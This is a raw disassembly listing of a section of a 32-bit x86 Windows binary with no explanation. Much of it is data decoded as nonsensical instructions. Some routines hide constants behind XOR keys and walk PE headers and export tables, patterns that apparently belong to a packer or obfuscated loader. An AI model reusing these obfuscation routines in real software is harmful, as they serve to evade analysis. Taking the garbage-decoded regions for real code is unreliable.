  42382a:	fiadd  WORD PTR [ecx+0x12]
  42382d:	push   ebp
  42382e:	pop    es
  42382f:	cmp    eax,0xf1e526ce
  423834:	cmp    BYTE PTR [eax+0x1c],al
  423837:	cmc    
  423838:	push   ecx
  423839:	ret    
  42383a:	xor    eax,0x8cf7bf21
  42383f:	cli    
  423840:	in     eax,0xbe
  423842:	inc    esi
  423843:	imul   edi,edi,0x29e5e2ff
  423849:	mov    ebp,0x25db645c
  42384e:	test   DWORD PTR [edx],ebx
  423850:	push   edx
  423851:	sbb    BYTE PTR [ecx+0x52],dl
  423854:	inc    ebp
  423855:	stos   BYTE PTR es:[edi],al
  423856:	push   ebp
  423857:	call   FWORD PTR [edi+eiz*4-0x55]
  42385b:	add    edi,DWORD PTR [eax-0x3f]
  42385e:	call   0xd16c1bdb
  423863:	daa    
  423864:	dec    esp
  423865:	push   ds
  423866:	repz cmovno esp,DWORD PTR [edi-0x18d24f7]
  42386e:	sub    DWORD PTR [eax+eiz*8-0x27],eax
  423872:	push   esi
  423873:	and    al,0x91
  423875:	cld    
  423876:	adc    esi,DWORD PTR ds:0x5745aed4
  42387c:	in     eax,0xa8
  42387e:	ins    BYTE PTR es:[edi],dx
  42387f:	push   edx
  423880:	fcomp  st(0)
  423882:	clc    
  423883:	cdq    
  423884:	call   FWORD PTR [edx]
  423886:	out    dx,al
  423887:	push   ecx
  423888:	mov    ds:0x2b9bd5a7,eax
  42388d:	inc    edi
  42388e:	call   0xb1336242
  423893:	es mov ebp,0x7913ab4f
  423899:	push   esi
  42389a:	stos   DWORD PTR es:[edi],eax
  42389b:	jns    0x4238f2
  42389d:	into   
  42389e:	(bad)  
  42389f:	ret    0x160c
  4238a2:	mov    ah,ch
  4238a4:	pop    esi
  4238a5:	xchg   esi,eax
  4238a6:	gs dec edx
  4238a8:	std    
  4238a9:	ret    
  4238aa:	and    al,0xd5
  4238ac:	paddsw mm1,QWORD PTR [edx]
  4238af:	mov    al,0x78
  4238b1:	push   edx
  4238b2:	xchg   DWORD PTR [esi],edx
  4238b4:	sub    BYTE PTR ds:0x88d411ee,dl
  4238ba:	add    al,0x7c
  4238bc:	add    eax,0xa4baa65f
  4238c1:	retf   0xa929
  4238c4:	in     al,dx
  4238c5:	xchg   BYTE PTR [edi+eax*8+0xf],dl
  4238c9:	popw   es
  4238cb:	and    ah,BYTE PTR [eax]
  4238cd:	and    al,ah
  4238cf:	(bad)  
  4238d1:	dec    edi
  4238d2:	popf   
  4238d3:	outs   dx,BYTE PTR ds:[esi]
  4238d4:	push   ebp
  4238d5:	cmp    eax,0x961e6fde
  4238da:	fs and cl,ah
  4238dd:	(bad)  
  4238de:	dec    edx
  4238df:	push   ebp
  4238e0:	pop    es
  4238e1:	mov    edi,0x16cc8d63
  4238e6:	and    BYTE PTR [ebp-0x19],0x12
  4238ea:	fwait
  4238eb:	retf   
  4238ec:	xchg   ecx,eax
  4238ed:	adc    BYTE PTR [edi-0xd],dl
  4238f0:	lds    ebp,FWORD PTR [ebx]
  4238f2:	rcl    DWORD PTR [edx-0x62],cl
  4238f5:	pop    ebx
  4238f6:	data16 jecxz 0x4238eb
  4238f9:	and    ecx,DWORD PTR [esi+0x7c]
  4238fc:	fsubr  st(3),st
  4238fe:	dec    esi
  4238ff:	or     bh,BYTE PTR [esi+0x17bd7584]
  423905:	test   eax,0xc945d1b5
  42390a:	push   edi
  42390b:	push   cs
  42390c:	inc    edi
  42390d:	int3   
  42390e:	pop    ss
  42390f:	cmp    esp,DWORD PTR [edi-0x55]
  423912:	ret    
  423913:	xchg   ebx,eax
  423914:	or     al,0xc0
  423916:	xor    eax,0xcd6b4a45
  42391b:	aaa    
  42391c:	pop    esp
  42391d:	inc    ecx
  42391e:	xchg   edx,eax
  42391f:	adc    ebx,DWORD PTR [eax]
  423921:	add    DWORD PTR [ebx+0x6b6a0935],ebx
  423927:	imul   ebp,DWORD PTR [ebp-0x6c],0x4db9bfa9
  42392e:	add    BYTE PTR [esi],bh
  423930:	add    dl,bh
  423932:	loop   0x42391e
  423934:	pop    esp
  423935:	sub    al,0x7b
  423937:	cwde   
  423938:	scas   eax,DWORD PTR es:[edi]
  423939:	jnp    0x42398e
  42393b:	pushf  
  42393c:	mov    edx,0xa2c713da
  423941:	mov    WORD PTR [ecx-0x7d],?
  423944:	lahf   
  423945:	dec    ecx
  423946:	lods   al,BYTE PTR ds:[esi]
  423947:	mov    ds:0x86b9c60b,al
  42394c:	cmp    al,0xbb
  42394e:	inc    esp
  42394f:	mov    eax,ds:0xca46abe4
  423954:	mov    esp,0xfadfab81
  423959:	scas   eax,DWORD PTR es:[edi]
  42395a:	mul    BYTE PTR [eax+0x4f3ed208]
  423960:	inc    eax
  423961:	fcom   QWORD PTR [ecx+eax*1]
  423964:	and    bl,al
  423966:	inc    BYTE PTR [ebp+ebx*1+0x631c0dba]
  42396d:	xchg   edi,eax
  42396e:	mov    DWORD PTR [edi-0x7a],ebp
  423971:	push   edi
  423972:	test   al,0x33
  423974:	cmp    al,0x2a
  423976:	and    eax,0x5b7442d0
  42397b:	cmc    
  42397c:	jg     0x423915
  42397e:	sbb    eax,DWORD PTR [edi-0x1a5e5ea7]
  423984:	clc    
  423985:	(bad)  
  423986:	lock rcr DWORD PTR [edi],0x1f
  42398a:	sti    
  42398b:	ss pop edi
  42398d:	pop    esp
  42398e:	xchg   esp,eax
  42398f:	mov    edi,0x69a1834
  423994:	ins    DWORD PTR es:[edi],dx
  423995:	push   edi
  423996:	push   ebp
  423997:	popa   
  423998:	stc    
  423999:	stos   DWORD PTR es:[edi],eax
  42399a:	fmul   QWORD PTR [eax-0x3f]
  42399d:	mov    ebx,0xa0225aef
  4239a2:	jge    0x423930
  4239a4:	shr    BYTE PTR [ecx],1
  4239a6:	jp     0x4239d7
  4239a8:	mov    ecx,DWORD PTR [ebx]
  4239aa:	cmp    al,0x12
  4239ac:	mov    cl,0x5
  4239ae:	ins    DWORD PTR es:[edi],dx
  4239af:	ror    BYTE PTR [ebx],1
  4239b1:	aad    0x47
  4239b3:	repnz sub cl,BYTE PTR [ecx+0x35d39c27]
  4239ba:	imul   edx,DWORD PTR [esi],0xffffffd8
  4239bd:	push   ss
  4239be:	out    dx,eax
  4239bf:	jmp    0x975c:0xde0496ad
  4239c6:	pop    edx
  4239c7:	or     DWORD PTR [edx+0x1c],esi
  4239ca:	cli    
  4239cb:	or     al,0xa3
  4239cd:	test   al,dh
  4239cf:	lea    esi,ds:[ecx+0x6c25d008]
  4239d6:	aam    0xc0
  4239d8:	dec    ecx
  4239da:	test   DWORD PTR ds:0x562c40eb,ebx
  4239e0:	and    al,0x93
  4239e2:	aam    0x98
  4239e4:	xor    al,al
  4239e6:	stos   DWORD PTR es:[edi],eax
  4239e7:	shl    DWORD PTR [ecx+0x19],cl
  4239ea:	jmp    0xc233:0xc2a03cc
  4239f1:	pushf  
  4239f2:	mov    eax,0xf4245bf4
  4239f7:	or     al,0x6c
  4239f9:	sub    ebp,DWORD PTR [ecx]
  4239fb:	lock adc esi,0x6f2aa24f
  423a02:	dec    eax
  423a03:	stos   DWORD PTR es:[edi],eax
  423a04:	jb     0x423a4c
  423a06:	sub    edx,eax
  423a08:	mov    ch,BYTE PTR [eax+0x6d]
  423a0b:	cdq    
  423a0c:	jae    0x4239a3
  423a0e:	pop    es
  423a0f:	sub    eax,0xbe945c1f
  423a14:	lock jmp 0x7c91:0xeabefcd6
  423a1c:	xchg   edi,eax
  423a1d:	ror    DWORD PTR [eax+0x15],0xe1
  423a21:	fs inc al
  423a24:	test   DWORD PTR [edx],0x980027d8
  423a2a:	fwait
  423a2b:	sub    eax,0xf5dc42ea
  423a30:	cmp    bl,0x31
  423a33:	imul   esi,DWORD PTR [ebp+edx*4+0x17],0xffffff8f
  423a38:	repz test al,0x77
  423a3c:	add    edx,esi
  423a3e:	rcr    DWORD PTR [ebx],cl
  423a40:	mov    ebp,ds
  423a42:	out    dx,al
  423a43:	rcl    BYTE PTR ds:0x78db4296,cl
  423a49:	hlt    
  423a4a:	and    DWORD PTR [eax+edx*1-0x7f],ebx
  423a4e:	mov    ebx,0x5be144f8
  423a53:	dec    ebp
  423a54:	and    al,0x57
  423a56:	push   edx
  423a57:	mov    ebx,0xeb523f54
  423a5c:	mov    eax,ds:0x3c00f10f
  423a61:	rol    DWORD PTR [ecx-0x1d],1
  423a64:	push   esi
  423a65:	xor    eax,0x4b6053c3
  423a6a:	loope  0x423a54
  423a6c:	pop    ebx
  423a6d:	jmp    0xa8cd635e
  423a72:	adc    al,0xe3
  423a74:	enter  0xb06,0xa2
  423a78:	sti    
  423a79:	call   0xe85916c3
  423a7e:	sub    esi,edx
  423a80:	mov    al,0xcd
  423a82:	mov    BYTE PTR [edi],dl
  423a84:	(bad)
  423a89:	lods   eax,DWORD PTR ds:[esi]
  423a8a:	pop    ss
  423a8b:	pop    es
  423a8c:	and    al,0xd9
  423a8e:	ss cld 
  423a90:	jno    0x423a68
  423a92:	inc    ebx
  423a93:	or     al,0x42
  423a95:	out    0x28,al
  423a97:	js     0x423ad7
  423a99:	jno    0x423a24
  423a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a9c:	les    ebp,FWORD PTR [ebp+ebp*1-0x6cde9831]
  423aa3:	iret   
  423aa4:	cld    
  423aa5:	(bad)  
  423aa6:	sahf   
  423aa7:	sbb    ecx,eax
  423aa9:	shl    ecx,0xaa
  423aac:	stos   BYTE PTR es:[edi],al
  423aad:	in     eax,0xa6
  423aaf:	push   ebp
  423ab0:	cmp    BYTE PTR [eax+0x5b],ch
  423ab3:	into   
  423ab4:	imul   esp,DWORD PTR [edx+0x365fa704],0x6c3924f5
  423abe:	cmp    eax,0x91d5c778
  423ac3:	xchg   edi,eax
  423ac4:	mov    ds,WORD PTR [ecx+0x3b]
  423ac7:	pop    eax
  423ac8:	clc    
  423ac9:	stos   BYTE PTR es:[edi],al
  423aca:	icebp  
  423acb:	idiv   BYTE PTR [ebx-0x15da74fa]
  423ad1:	sub    BYTE PTR [ebx+ecx*4+0x69facc56],0x3c
  423ad9:	(bad)  
  423ada:	jae    0x423a6d
  423adc:	pop    ebp
  423add:	push   0x62
  423adf:	inc    ebx
  423ae0:	iret   
  423ae1:	mov    cl,0x51
  423ae3:	jge    0x423a7a
  423ae5:	or     al,0xa3
  423ae7:	out    0x69,al
  423ae9:	clc    
  423aea:	out    dx,eax
  423aeb:	je     0x423a78
  423aed:	push   ebp
  423aee:	clc    
  423aef:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  423af7:	mov    edx,DWORD PTR [ebp-0x54]
  423afa:	xor    edx,esi
  423afc:	lea    eax,[edx+eax*1+0x3272db]
  423b03:	movzx  edx,BYTE PTR [ebp-0x1]
  423b07:	xor    edx,eax
  423b09:	mov    BYTE PTR [ebp-0x1],dl
  423b0c:	mov    al,BYTE PTR [ebp-0x1]
  423b0f:	mov    edx,DWORD PTR [ebp-0x1c]
  423b12:	mov    ebx,DWORD PTR [ebp-0xc]
  423b15:	xor    edx,esi
  423b17:	add    edx,edi
  423b19:	imul   edx,ebx
  423b1c:	mov    ebx,DWORD PTR [ebp-0x8]
  423b1f:	mov    BYTE PTR [edx+ebx*1],al
  423b22:	mov    eax,DWORD PTR [ebp-0x30]
  423b25:	mov    edx,DWORD PTR [ebp-0x3c]
  423b28:	xor    eax,esi
  423b2a:	xor    edx,esi
  423b2c:	add    eax,edi
  423b2e:	add    edx,edi
  423b30:	imul   eax,edx
  423b33:	add    eax,DWORD PTR [ebp-0xc]
  423b36:	mov    DWORD PTR [ebp-0xc],eax
  423b39:	mov    eax,DWORD PTR [ebp-0xc]
  423b3c:	mov    edx,DWORD PTR [ebp-0x24]
  423b3f:	cmp    edx,eax
  423b41:	jb     0x41e9a5
  423b47:	mov    eax,DWORD PTR [ebp-0x3c]
  423b4a:	mov    edx,DWORD PTR [ebp-0x24]
  423b4d:	xor    eax,esi
  423b4f:	add    eax,edi
  423b51:	imul   eax,edx
  423b54:	mov    edx,DWORD PTR [ebp-0x20]
  423b57:	xor    edx,esi
  423b59:	add    edx,edi
  423b5b:	or     eax,edx
  423b5d:	mov    edx,DWORD PTR [ebp-0x18]
  423b60:	xor    edx,esi
  423b62:	add    eax,edx
  423b64:	mov    edx,DWORD PTR [ebp-0x18]
  423b67:	xor    edx,esi
  423b69:	add    eax,edx
  423b6b:	mov    edx,DWORD PTR [ebp-0x10]
  423b6e:	lea    eax,[eax+edx*1+0x64e5b6]
  423b75:	jmp    0x423b89
  423b7a:	mov    eax,DWORD PTR [ebp-0x18]
  423b7d:	mov    edx,DWORD PTR [ebp-0x10]
  423b80:	xor    eax,esi
  423b82:	lea    eax,[eax+edx*1+0x3272db]
  423b89:	mov    DWORD PTR [ebp-0x10],eax
  423b8c:	jmp    0x41e8f2
  423b91:	mov    eax,DWORD PTR [ebp-0x38]
  423b94:	mov    edx,DWORD PTR [ebp+0xc]
  423b97:	xor    edx,esi
  423b99:	lea    ecx,[ecx+edx*1+0x3272db]
  423ba0:	lea    edx,[ecx-0x3272db]
  423ba6:	xor    edx,esi
  423ba8:	cmp    edx,0xf89c95b6
  423bae:	jne    0x41e770
  423bb4:	mov    ecx,DWORD PTR [ebp+0x8]
  423bb7:	mov    edx,DWORD PTR [ebp+0xc]
  423bba:	mov    ebx,DWORD PTR [ebp+0x8]
  423bbd:	xor    edx,esi
  423bbf:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  423bc6:	xor    ecx,esi
  423bc8:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  423bcf:	xor    ebx,esi
  423bd1:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  423bd8:	mov    edx,DWORD PTR [ebp+0xc]
  423bdb:	xor    edx,esi
  423bdd:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  423be4:	mov    eax,DWORD PTR [ebp+0xc]
  423be7:	xor    eax,esi
  423be9:	add    eax,edi
  423beb:	pop    edi
  423bec:	pop    esi
  423bed:	pop    ebx
  423bee:	leave  
  423bef:	ret    0x8
  423bf2:	push   ebp
  423bf3:	mov    ebp,esp
  423bf5:	push   ecx
  423bf6:	mov    eax,ds:0x42c008
  423bfb:	xor    DWORD PTR ds:0x42c000,eax
  423c01:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  423c08:	mov    eax,DWORD PTR [ebp+0x8]
  423c0b:	sbb    DWORD PTR ds:0x42d010,0x5f50
  423c15:	mov    al,BYTE PTR [eax]
  423c17:	add    DWORD PTR ds:0x429020,0x42b018
  423c21:	add    al,0xd
  423c23:	xor    DWORD PTR ds:0x42901c,0x429000
  423c2d:	xor    al,0x6f
  423c2f:	mov    DWORD PTR ds:0x42d008,0x56e
  423c39:	cmp    al,0x35
  423c3b:	mov    DWORD PTR ds:0x42c000,0x518
  423c45:	jne    0x423cc0
  423c4b:	mov    eax,DWORD PTR [ebp+0x8]
  423c4e:	mov    edx,DWORD PTR ds:0x429014
  423c54:	or     DWORD PTR ds:0x429010,edx
  423c5a:	mov    ecx,DWORD PTR [ebp+0x8]
  423c5d:	add    ecx,DWORD PTR [eax+0x3c]
  423c60:	mov    edx,0x7510893
  423c65:	adc    eax,DWORD PTR ds:0x42c01c
  423c6b:	mov    DWORD PTR [ebp+0x8],ecx
  423c6e:	mov    eax,DWORD PTR [ebp-0x4]
  423c71:	xor    eax,edx
  423c73:	adc    ecx,0x2aad
  423c79:	push   esi
  423c7a:	add    DWORD PTR ds:0x42d01c,0x22ba
  423c84:	mov    esi,DWORD PTR [ebp+0x8]
  423c87:	xor    ecx,ecx
  423c89:	xor    ecx,DWORD PTR ds:0x42901c
  423c8f:	xor    ecx,DWORD PTR ds:0x42a010
  423c95:	mov    DWORD PTR ds:0x42901c,ecx
  423c9b:	mov    ecx,0x3272db
  423ca0:	add    eax,ecx
  423ca2:	cmp    DWORD PTR [esi+0x54],eax
  423ca5:	pop    esi
  423ca6:	je     0x423cb4
  423cac:	mov    eax,DWORD PTR [ebp+0x8]
  423caf:	jmp    0x423ccd
  423cb4:	mov    eax,DWORD PTR [ebp-0x4]
  423cb7:	xor    eax,edx
  423cb9:	add    eax,ecx
  423cbb:	jmp    0x423ccd
  423cc0:	mov    eax,DWORD PTR [ebp-0x4]
  423cc3:	xor    eax,0x7510893
  423cc8:	add    eax,0x3272db
  423ccd:	leave  
  423cce:	ret    0x4
  423cd1:	push   ebp
  423cd2:	mov    ebp,esp
  423cd4:	push   ecx
  423cd5:	sub    DWORD PTR ds:0x42d010,0x2dcc
  423cdf:	push   ecx
  423ce0:	and    DWORD PTR ds:0x42d014,0x0
  423cea:	jmp    0x423cfe
  423cef:	xor    edx,edx
  423cf1:	add    edx,DWORD PTR ds:0x42d014
  423cf7:	inc    edx
  423cf8:	mov    DWORD PTR ds:0x42d014,edx
  423cfe:	cmp    DWORD PTR ds:0x42d014,0x1d
  423d05:	jae    0x423d3c
  423d0b:	cmp    DWORD PTR ds:0x42d014,0x26
  423d12:	jne    0x423d37
  423d18:	push   0x643f
  423d1d:	push   DWORD PTR [ebp-0x24]
  423d20:	push   0x42a010
  423d25:	push   DWORD PTR [ebp-0xc]
  423d28:	push   DWORD PTR [ebp-0x10]
  423d2b:	push   DWORD PTR [ebp-0x10]
  423d2e:	push   DWORD PTR [ebp-0x28]
  423d31:	call   DWORD PTR ds:0x42502c
  423d37:	jmp    0x423cef
  423d3c:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  423d43:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  423d4a:	dec    eax
  423d4b:	mov    eax,DWORD PTR [ebp-0x4]
  423d4e:	add    edx,0x6ccb
  423d54:	push   esi
  423d55:	mov    esi,DWORD PTR [ebp-0x8]
  423d58:	adc    DWORD PTR ds:0x42a00c,ebx
  423d5e:	mov    edx,0x7510893
  423d63:	sbb    DWORD PTR ds:0x42c018,0x5978
  423d6d:	xor    eax,edx
  423d6f:	sbb    DWORD PTR ds:0x42901c,0x3646
  423d79:	xor    esi,edx
  423d7b:	sub    DWORD PTR ds:0x429014,0x4430
  423d85:	mov    ecx,0x3272db
  423d8a:	sbb    DWORD PTR ds:0x42d01c,0x42900c
  423d94:	add    esi,ecx
  423d96:	mov    DWORD PTR ds:0x42a010,0x31b3
  423da0:	add    eax,ecx
  423da2:	inc    DWORD PTR ds:0x42c01c
  423da8:	imul   eax,esi
  423dab:	mov    esi,DWORD PTR [ebp+0xc]
  423dae:	mov    DWORD PTR ds:0x429028,0xd41
  423db8:	cmp    esi,eax
  423dba:	jne    0x423dd8
  423dc0:	and    esi,eax
  423dc2:	mov    eax,DWORD PTR [ebp-0x4]
  423dc5:	mov    esi,DWORD PTR [ebp-0x8]
  423dc8:	xor    eax,edx
  423dca:	xor    esi,edx
  423dcc:	add    eax,ecx
  423dce:	add    esi,ecx
  423dd0:	imul   eax,esi
  423dd3:	jmp    0x423e13
  423dd8:	mov    eax,DWORD PTR [ebp+0xc]
  423ddb:	mov    eax,DWORD PTR [eax+0x78]
  423dde:	mov    DWORD PTR [ebp+0xc],eax
  423de1:	mov    eax,DWORD PTR [ebp-0x4]
  423de4:	mov    esi,DWORD PTR [ebp-0x8]
  423de7:	xor    eax,edx
  423de9:	xor    esi,edx
  423deb:	add    eax,ecx
  423ded:	add    esi,ecx
  423def:	imul   eax,esi
  423df2:	mov    esi,DWORD PTR [ebp+0xc]
  423df5:	cmp    esi,eax
  423df7:	mov    eax,DWORD PTR [ebp-0x4]
  423dfa:	je     0x423dc5
  423e00:	xor    eax,edx
  423e02:	add    eax,ecx
  423e04:	mov    ecx,DWORD PTR [ebp+0xc]
  423e07:	imul   eax,ecx
  423e0a:	add    eax,DWORD PTR [ebp+0x8]
  423e0d:	mov    DWORD PTR [ebp+0xc],eax
  423e10:	mov    eax,DWORD PTR [ebp+0xc]
  423e13:	pop    esi
  423e14:	leave  
  423e15:	ret    0x8
  423e18:	add    BYTE PTR [eax-0x5ffbffbe],ah
  423e1e:	inc    edx
  423e1f:	add    BYTE PTR [eax],cl
  423e21:	mov    al,ds:0xa00c0042
  423e26:	inc    edx
  423e27:	add    BYTE PTR [eax],dl
  423e29:	mov    al,ds:0xa0140042
  423e2e:	inc    edx
  423e2f:	add    BYTE PTR [eax],bl
  423e31:	mov    al,ds:0xa01c0042
  423e36:	inc    edx
  423e37:	add    BYTE PTR [eax],al
  423e39:	mov    al,0x42
  423e3b:	add    BYTE PTR [eax+esi*4],al
  423e3e:	inc    edx
  423e3f:	add    BYTE PTR [eax],cl
  423e41:	mov    al,0x42
  423e43:	add    BYTE PTR [eax+esi*4],cl
  423e46:	inc    edx
  423e47:	add    BYTE PTR [eax],dl
  423e49:	mov    al,0x42
  423e4b:	add    BYTE PTR [eax+esi*4],dl
  423e4e:	inc    edx
  423e4f:	add    BYTE PTR [eax],bl
  423e51:	mov    al,0x42
  423e53:	add    BYTE PTR [eax+esi*4],bl
  423e56:	inc    edx
  423e57:	add    BYTE PTR [eax],al
  423e59:	rol    BYTE PTR [edx+0x0],0x4
  423e5d:	rol    BYTE PTR [edx+0x0],0x8
  423e61:	rol    BYTE PTR [edx+0x0],0xc
  423e65:	rol    BYTE PTR [edx+0x0],0x10
  423e69:	rol    BYTE PTR [edx+0x0],0x14
  423e6d:	rol    BYTE PTR [edx+0x0],0x18
  423e71:	rol    BYTE PTR [edx+0x0],0x1c
  423e75:	rol    BYTE PTR [edx+0x0],0x75
  423e79:	ins    DWORD PTR es:[edi],dx
  423e7a:	push   ecx
  423e7b:	push   eax
  423e7c:	jo     0x423ef8
  423e7e:	addr16 jo 0x423ed7
  423e81:	pop    eax
  423e82:	inc    ebp
  423e83:	push   edx
  423e84:	jb     0x423efa
  423e86:	inc    esi
  423e87:	je     0x423ed0
  423e89:	gs ins BYTE PTR es:[edi],dx
  423e8b:	dec    esp
  423e8c:	js     0x423ef6
  423e8e:	inc    edx
  423e8f:	js     0x423ed7
  423e91:	arpl   WORD PTR [edx+0x66],ax
  423e94:	inc    ebx
  423e95:	push   ebp
  423e96:	jno    0x423f0e
  423e98:	xor    al,0x42
  423e9a:	inc    edx
  423e9b:	add    BYTE PTR [edx+eax*2],bh
  423e9e:	inc    edx
  423e9f:	add    al,ah
  423ea1:	inc    eax
  423ea2:	inc    edx
  423ea3:	add    bh,ch
  423ea5:	or     esi,DWORD PTR [edx+0x304e790e]
  423eab:	dec    esi
  423eac:	xchg   DWORD PTR [edi+0x3d],ecx
  423eaf:	dec    esi
  423eb0:	scas   eax,DWORD PTR es:[edi]
  423eb1:	dec    edi
  423eb2:	ds dec esi
  423eb4:	js     0x423f04
  423eb6:	cmp    ecx,DWORD PTR [esi-0x64]
  423eb9:	dec    edi
  423eba:	inc    esp
  423ebb:	dec    esi
  423ebc:	jae    0x423f0c
  423ebe:	inc    ecx
  423ebf:	dec    esi
  423ec0:	xor    BYTE PTR [esi+0x40],cl
  423ec3:	dec    esi
  423ec4:	pop    esp
  423ec5:	pop    ebp
  423ec6:	pop    edi
  423ec7:	push   edx
  423ec8:	cmp    DWORD PTR [esi+0x79],ecx
  423ecb:	dec    esi
  423ecc:	xor    BYTE PTR [esi-0x79],cl
  423ecf:	dec    edi
  423ed0:	cmp    eax,0x3e4faf4e
  423ed5:	dec    esi
  423ed6:	js     0x423f26
  423ed8:	cmp    ecx,DWORD PTR [esi-0x64]
  423edb:	dec    edi
  423edc:	inc    esp
  423edd:	dec    esi
  423ede:	mov    DWORD PTR [edi+0x41],ecx
  423ee1:	dec    esi
  423ee2:	xor    BYTE PTR [esi+0x40],cl
  423ee5:	dec    esi
  423ee6:	pop    esp
  423ee7:	ins    DWORD PTR es:[edi],dx
  423ee8:	pop    edi
  423ee9:	bound  edi,QWORD PTR [ecx]
  423eeb:	dec    esi
  423eec:	jns    0x423f3c
  423eee:	xor    BYTE PTR [esi-0x80],cl
  423ef1:	dec    edi
  423ef2:	cmp    eax,0x394e734e
  423ef7:	dec    esi
  423ef8:	mov    ds:0x304e3a4f,al
  423efd:	dec    esi
  423efe:	inc    esi
  423eff:	dec    esi
  423f00:	pop    esp
  423f01:	jge    0x423f62
  423f03:	jb     0x423f74
  423f05:	sub    BYTE PTR [esi-0x7d],0x7e
  423f09:	xchg   ebx,eax
  423f0a:	jns    0x423e9c
  423f0c:	aas    
  423f0d:	dec    esi
  423f0e:	test   BYTE PTR [edi+0x30],cl
  423f11:	dec    esi
  423f12:	test   BYTE PTR [edi+0x3c],cl
  423f15:	dec    esi
  423f16:	mov    ds:0x734e394f,al
  423f1b:	dec    esi
  423f1c:	inc    ebp
  423f1d:	dec    esi
  423f1e:	xor    BYTE PTR [esi+0x44],cl
  423f21:	dec    esi
  423f22:	pop    esp
  423f23:	lea    ebx,[edi-0x7e]
  423f26:	outs   dx,DWORD PTR ds:[esi]
  423f27:	xchg   edx,eax
  423f28:	outs   dx,BYTE PTR ds:[esi]
  423f29:	xchg   ebx,eax
  423f2a:	jle    0x423ecf
  423f2c:	jns    0x423ece
  423f2e:	aas    
  423f2f:	dec    esi
  423f30:	test   BYTE PTR [edi+0x30],cl
  423f33:	dec    esi
  423f34:	test   BYTE PTR [edi+0x3c],cl
  423f37:	dec    esi
  423f38:	mov    ds:0x894e394f,al
  423f3d:	dec    edi
  423f3e:	inc    ebp
  423f3f:	dec    esi
  423f40:	xor    BYTE PTR [esi+0x44],cl
  423f43:	dec    esi
  423f44:	pop    esp
  423f45:	popf   
  423f46:	pop    edi
  423f47:	xchg   edx,eax
  423f48:	outs   dx,DWORD PTR ds:[esi]
  423f49:	mov    ds:0xb37ea36e,al
  423f4e:	jns    0x423f00
  423f50:	aas    
  423f51:	dec    esi
  423f52:	mov    cs,WORD PTR [edi+0x30]
  423f55:	dec    esi
  423f56:	lods   al,BYTE PTR ds:[esi]
  423f57:	dec    edi
  423f58:	cmp    eax,0x394e734e
  423f5d:	dec    esi
  423f5e:	mov    eax,ds:0x304e3a4f
  423f63:	dec    esi
  423f64:	inc    esp
  423f65:	dec    esi
  423f66:	pop    esp
  423f67:	lods   eax,DWORD PTR ds:[esi]
  423f68:	pop    edi
  423f69:	mov    ds:0xb36eb26f,al
  423f6e:	jle    0x423f33
  423f70:	jns    0x423f32
  423f72:	aas    
  423f73:	dec    esi
  423f74:	mov    cs,WORD PTR [edi+0x30]
  423f77:	dec    esi
  423f78:	lods   al,BYTE PTR ds:[esi]
  423f79:	dec    edi
  423f7a:	cmp    eax,0x394e7e4e
  423f7f:	dec    esi
  423f80:	lahf   
  423f81:	dec    edi
  423f82:	cmp    ecx,DWORD PTR [esi+0x30]
  423f85:	dec    esi
  423f86:	inc    ebp
  423f87:	dec    esi
  423f88:	pop    esp
  423f89:	mov    ebp,0xc26fb25f
  423f8e:	outs   dx,BYTE PTR ds:[esi]
  423f8f:	ret    
  423f90:	jle    0x423f65
  423f92:	jns    0x423f64
  423f94:	aas    
  423f95:	dec    esi
  423f96:	mov    cs,WORD PTR [edi+0x30]
  423f99:	dec    esi
  423f9a:	lods   al,BYTE PTR ds:[esi]
  423f9b:	dec    edi
  423f9c:	cmp    eax,0x394f804e
  423fa1:	dec    esi
  423fa2:	lods   al,BYTE PTR ds:[esi]
  423fa3:	dec    edi
  423fa4:	cmp    cl,BYTE PTR [esi+0x30]
  423fa7:	dec    esi
  423fa8:	inc    esi
  423fa9:	dec    esi
  423faa:	pop    esp
  423fab:	int    0x5f
  423fad:	ret    0xd26f
  423fb0:	outs   dx,BYTE PTR ds:[esi]
  423fb1:	sar    DWORD PTR [esi-0x1d],cl
  423fb4:	jns    0x423f96
  423fb6:	aas    
  423fb7:	dec    esi
  423fb8:	mov    cs,WORD PTR [edi+0x30]
  423fbb:	dec    esi
  423fbc:	lods   al,BYTE PTR ds:[esi]
  423fbd:	dec    edi
  423fbe:	cmp    eax,0x394f834e
  423fc3:	dec    esi
  423fc4:	mov    ds:0x304e3a4f,al
  423fc9:	dec    esi
  423fca:	inc    esp
  423fcb:	dec    esi
  423fcc:	pop    esp
  423fcd:	fstp   QWORD PTR [edi-0x2e]
  423fd0:	outs   dx,DWORD PTR ds:[esi]
  423fd1:	loop   0x424041
  423fd3:	jecxz  0x424053
  423fd5:	repz jns 0x423fc8
  423fd8:	aas    
  423fd9:	dec    esi
  423fda:	lea    ecx,[edi+0x30]
  423fdd:	dec    esi
  423fde:	lahf   
  423fdf:	dec    edi
  423fe0:	cmp    eax,0x3c4fa04e
  423fe5:	dec    esi
  423fe6:	xor    BYTE PTR [esi+0x3f],cl
  423fe9:	dec    esi
  423fea:	pop    esp
  423feb:	in     eax,dx
  423fec:	pop    edi
  423fed:	loop   0x42405e
  423fef:	repnz outs dx,BYTE PTR ds:[esi]
  423ff1:	repz jle 0x423ff7
  423ff4:	jns    0x423ff6
  423ff6:	jle    0x42400b
  423ff8:	jns    0x42400a
  423ffa:	cmp    al,0x4e
  423ffc:	jg     0x42404c
  423ffe:	xor    BYTE PTR [esi-0x65],cl
  424001:	dec    edi
  424002:	xor    cl,BYTE PTR [esi-0x80]
  424005:	dec    edi
  424006:	cmp    al,0x4e
  424008:	lods   eax,DWORD PTR ds:[esi]
  424009:	dec    edi
  42400a:	cmp    ecx,DWORD PTR [esi+0x30]
  42400d:	dec    esi
  42400e:	inc    ebp
  42400f:	dec    esi
  424010:	pop    esp
  424011:	or     eax,0x126f025f
  424016:	outs   dx,BYTE PTR ds:[esi]
  424017:	adc    edi,DWORD PTR [esi+0x23]
  42401a:	jns    0x42403c
  42401c:	aas    
  42401d:	dec    esi
  42401e:	add    BYTE PTR [eax],al
  424020:	test   al,0x3e
  424022:	inc    edx
  424023:	add    BYTE PTR [eax+eax*2+0x40a40042],bl
  42402a:	inc    edx
